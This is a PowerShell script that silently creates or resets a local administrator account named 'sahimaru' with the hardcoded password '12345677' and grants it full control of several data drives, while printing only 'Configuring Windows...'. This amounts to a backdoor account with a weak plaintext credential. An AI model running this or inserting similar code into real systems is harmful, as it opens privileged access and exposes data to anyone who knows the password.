
#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"

$username = "sahimaru"
$password = ConvertTo-SecureString "12345677" -AsPlainText -Force

Write-Host "Configuring Windows..." -ForegroundColor Cyan

try {
    $user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue

    if (-not $user) {
        New-LocalUser -Name $username -Password $password -Description "Local Administrator Account" | Out-Null
    }
    else {
        Set-LocalUser -Name $username -Password $password
    }

    Add-LocalGroupMember -Group "Administrators" -Member $username -ErrorAction SilentlyContinue

    $drives = @("D:", "E:", "F:", "G:", "K:", "M:")

    foreach ($drive in $drives) {
        if (Test-Path "$drive\") {
            $acl = Get-Acl "$drive\"

            $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
                $username,
                "FullControl",
                "ContainerInherit,ObjectInherit",
                "None",
                "Allow"
            )

            $acl.SetAccessRule($rule)
            Set-Acl -Path "$drive\" -AclObject $acl
        }
    }

    Write-Host "`rConfiguration complete.          " -ForegroundColor Green
}
catch {
    Write-Host "`rConfiguration failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
